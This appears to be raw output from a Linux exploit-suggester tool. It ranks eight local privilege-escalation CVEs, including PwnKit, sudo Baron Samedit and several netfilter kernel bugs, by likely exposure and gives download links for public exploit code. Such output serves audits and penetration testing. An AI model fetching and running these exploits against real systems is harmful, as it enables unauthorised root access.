cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2018-18955] subuid_shell

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
   Exposure: probable
   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip
   Comments: CONFIG_USER_NS needs to be enabled

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security//5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security//5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
